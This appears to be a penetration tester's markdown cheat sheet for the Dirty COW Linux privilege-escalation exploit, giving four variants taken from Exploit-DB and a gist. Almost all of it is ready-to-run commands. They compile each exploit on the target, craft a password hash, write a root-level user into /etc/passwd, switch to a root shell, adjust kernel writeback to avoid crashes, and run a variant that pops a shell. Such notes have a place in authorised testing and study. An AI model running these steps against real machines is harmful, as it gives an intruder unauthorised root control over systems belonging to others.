## dirty cow - 40611.c

### Compile on target
```
gcc -pthread 40611.c -o dirtyc0w
```

### Generate hash for /etc/passwd
```
openssl passwd -1 -salt <user> <password>
```

### Append new user to /etc/passwd
```
./dirtyc0w /etc/passwd "<user>:<hash>:0:0:root:/bin/bash"
```

### Change to root shell
```
su <user>
```

## another variant - 40839.c

### Compile on target
```
gcc -pthread 40839.c -o dirty -lcrypt
```

### Append new user to /etc/passwd
```
./dirty <password>
```

### Change to root shell
```
su firefart
```

## another variant - https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c

### Compile on target - (un)comment correct payload first (x86 or x64)
```
gcc cowroot.c -o cowroot -pthread
```

### Run exploit
```
./cowroot
```

### Disable dirty writeback may prevent machine from crash
```
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

## another variant - 40847.cpp

### Compile on target
```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

### Pop reverse shell (automatically disable dirty writeback)
```
./dcow -s
```

### References:
* https://www.exploit-db.com/exploits/40611  
* https://www.exploit-db.com/exploits/40839  

